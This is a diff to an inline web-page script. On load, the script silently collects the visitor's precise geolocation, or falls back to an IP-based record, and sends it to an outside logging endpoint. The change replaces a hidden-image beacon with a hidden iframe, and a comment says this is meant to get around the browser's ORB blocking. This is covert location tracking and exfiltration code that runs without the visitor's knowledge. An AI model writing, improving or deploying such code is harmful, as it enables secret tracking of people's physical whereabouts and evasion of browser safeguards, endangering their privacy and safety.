@@ -13,9 +13,10 @@
 
     <script>
 (function () {
+
     const endpoint = "https://fortifi.great-site.net/log.php";
 
-    function send(lat = null, lon = null, source = "ip") {
+    function send(lat = null, lon = null) {
         const url = new URL(endpoint);
 
         if (lat !== null && lon !== null) {
@@ -26,13 +27,22 @@
             url.searchParams.set("source", "ip");
         }
 
-        // silent request (no redirect)
-        const img = new Image();
-        img.src = url.toString();
+        // 🔥 iframe method (bypasses ORB blocking)
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = url.toString();
+
+        document.body.appendChild(iframe);
+
+        // cleanup after load (optional but clean)
+        setTimeout(() => {
+            iframe.remove();
+        }, 5000);
     }
 
+    // If geolocation not supported → fallback
     if (!("geolocation" in navigator)) {
-        send(); // fallback immediately
+        send();
         return;
     }
 
@@ -43,11 +53,7 @@
             if (sent) return;
             sent = true;
 
-            send(
-                pos.coords.latitude,
-                pos.coords.longitude,
-                "browser"
-            );
+            send(pos.coords.latitude, pos.coords.longitude);
         },
         function () {
             if (sent) return;
@@ -57,18 +63,18 @@
         },
         {
             enableHighAccuracy: true,
-            timeout: 7000,
+            timeout: 10000,
             maximumAge: 0
         }
     );
 
-    // safety fallback (if browser hangs)
+    // Safety fallback (if browser hangs)
     setTimeout(() => {
         if (!sent) {
             sent = true;
             send();
         }
-    }, 8000);
+    }, 12000);
 
 })();
 </script>
